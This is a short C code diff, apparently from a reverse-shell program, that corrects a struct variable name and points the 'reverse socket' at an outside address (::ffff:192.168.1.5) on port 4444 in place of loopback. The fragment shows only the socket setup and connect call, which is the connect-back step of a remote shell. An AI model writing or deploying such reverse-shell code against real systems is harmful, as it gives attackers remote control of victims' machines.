@@ -23,8 +23,8 @@ int main()
     
     //Initialize sockaddr struct for reverse socket
     srvaddr.sin6_family = AF_INET6;  
-    srv.sin6_port = htons(4444);  
-    inet_pton(AF_INET6, "::1", &srvaddr.sin6_addr);
+    srvaddr.sin6_port = htons(4444);  
+    inet_pton(AF_INET6, "::ffff:192.168.1.5", &srvaddr.sin6_addr);
     
     //Connect to socket
 	connect(sockfd, (struct sockaddr *)&srvaddr, sizeof(srvaddr));
